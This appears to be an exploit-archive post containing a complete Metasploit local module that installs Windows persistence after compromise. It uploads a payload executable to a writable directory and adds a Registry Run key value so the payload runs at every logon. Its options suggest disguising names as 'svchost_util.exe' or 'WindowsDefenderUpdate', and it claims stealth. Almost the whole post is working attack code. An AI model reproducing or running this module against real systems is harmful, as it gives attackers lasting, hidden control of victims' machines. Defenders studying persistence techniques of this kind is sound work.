@@ -1,0 +1,150 @@
+=============================================================================================================================================
+| # Title     : Windows Registry Run Persistence Metasploit Module                                                                          |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 147.0.1 (64 bits)                                                            |
+| # Vendor    : https://www.metasploit.com/                                                                                                 |
+=============================================================================================================================================
+
+[+] References : 
+
+[+] Summary    : This Metasploit module is a Windows persistence module designed to maintain access to a compromised system after a successful exploitation and an active Meterpreter session has been obtained.
+
+[+] The module works by:
+
+Creating a value inside the Windows Registry Run key
+
+Pointing that value to a payload executable stored on disk
+
+Ensuring the payload is executed automatically each time the user logs in or the system boots
+
+[+] POC :
+
+
+class MetasploitModule < Msf::Exploit::Local
+  Rank = GreatRanking
+
+  include Msf::Post::File
+  include Msf::Post::Windows::Registry
+  include Msf::Exploit::Local::Persistence
+  
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name'           => 'Windows Registry Run Persistence (Hardened)',
+        'Description'    => %q{
+          This module establishes persistence on Windows systems by creating a value 
+          within the 'Run' registry key. It is hardened to handle privilege errors, 
+          select safe writable paths, and utilize native Meterpreter APIs for 
+          stealth and reliability.
+        },
+        'License'        => MSF_LICENSE,
+        'Author'         => ['Indoushka'],
+        'Platform'       => [ 'win' ],
+        'Arch'           => [ ARCH_X86, ARCH_X64 ],
+        'SessionTypes'   => [ 'meterpreter' ],
+        'Targets'        => [ [ 'Windows Universal', {} ] ],
+        'DefaultTarget'  => 0,
+        'References'     => [
+          ['ATT&CK', 'T1547.001']
+        ],
+        'DisclosureDate' => '2025-12-25',
+        'Notes'          => {
+          'Stability'   => [CRASH_SAFE],
+          'Reliability' => [REPEATABLE_SESSION],
+          'SideEffects' => [ARTIFACTS_ON_DISK, CONFIG_CHANGES]
+        }
+      )
+    )
+
+    register_options([
+      OptString.new('PAYLOAD_NAME', [ false, 'Name of the payload file (e.g., svchost_util.exe)' ]),
+      OptString.new('REG_NAME',     [ false, 'Registry value name (e.g., WindowsDefenderUpdate)' ]),
+      OptBool.new('HKLM',           [ false, 'Try HKLM instead of HKCU (Requires Administrative privileges)', false ])
+    ])
+
+    @clean_up_rc ||= []
+  end
+
+  def check
+    return CheckCode::Safe('Session is not Windows') unless session.platform == 'windows'
+    CheckCode::Appears('System supports Registry Run persistence')
+  end
+
+  def exploit
+    print_status("Starting hardened persistence installation...")
+    install_persistence
+  end
+
+  def get_safe_path
+    paths = []
+
+    sys_root = session.sys.config.getenv('SystemRoot')
+    paths << "#{sys_root}\\Temp" if datastore['HKLM'] && sys_root
+
+    paths << session.sys.config.getenv('TEMP')
+    paths << session.sys.config.getenv('USERPROFILE')
+    paths << 'C:\\Users\\Public'
+
+    paths.compact.each do |path|
+      begin
+        test_file = "#{path}\\#{Rex::Text.rand_text_alpha(4)}.tmp"
+        write_file(test_file, "")
+        rm_f(test_file)
+        return path
+      rescue Rex::Post::Meterpreter::RequestError
+        next
+      end
+    end
+
+    fail_with(Failure::NoAccess, "Could not find a writable directory on the target")
+  end
+
+  def install_persistence
+    root_key  = datastore['HKLM'] ? 'HKLM' : 'HKCU'
+    run_key   = 'Software\\Microsoft\\Windows\\CurrentVersion\\Run'
+    reg_value = datastore['REG_NAME'] || Rex::Text.rand_text_alpha(8)
+    
+    target_dir   = get_safe_path
+    payload_name = datastore['PAYLOAD_NAME'] || "#{Rex::Text.rand_text_alpha(6)}.exe"
+    payload_path = "#{target_dir}\\#{payload_name}"
+
+    print_status("Uploading payload to: #{payload_path}")
+    begin
+      write_file(payload_path, generate_payload_exe)
+    rescue Rex::Post::Meterpreter::RequestError => e
+      fail_with(Failure::NoAccess, "Upload failed: #{e.message}")
+    end
+
+    unless file?(payload_path)
+      fail_with(Failure::PayloadFailed, "Payload was not found on disk after upload")
+    end
+
+    print_status("Updating registry: #{root_key}\\#{run_key}")
+    begin
+      registry_setvaldata(root_key, run_key, reg_value, payload_path, 'REG_SZ')
+      print_good("Persistence successfully established in Registry")
+    rescue Rex::Post::Meterpreter::RequestError => e
+      fail_with(Failure::NoAccess, "Registry access denied: #{e.message}. High integrity session might be required for HKLM.")
+    end
+
+    report_note(
+      host: session.peerhost,
+      type: 'host.persistence.registry',
+      data: {
+        path: payload_path,
+        reg_key: "#{root_key}\\#{run_key}\\#{reg_value}"
+      }
+    )
+
+    print_status("Queueing cleanup commands...")
+    @clean_up_rc << "reg deleteval -k \"#{root_key}\\#{run_key}\" -v \"#{reg_value}\""
+    @clean_up_rc << "rm -f \"#{payload_path.gsub('\\', '/')}\""
+
+    print_good("Persistence is live. Cleanup commands are ready for session termination.")
+  end
+end
+	
+Greetings to :============================================================
+jericho * Larry W. Cashdollar * r00t * Malvuln (John Page aka hyp3rlinx)*|
+==========================================================================
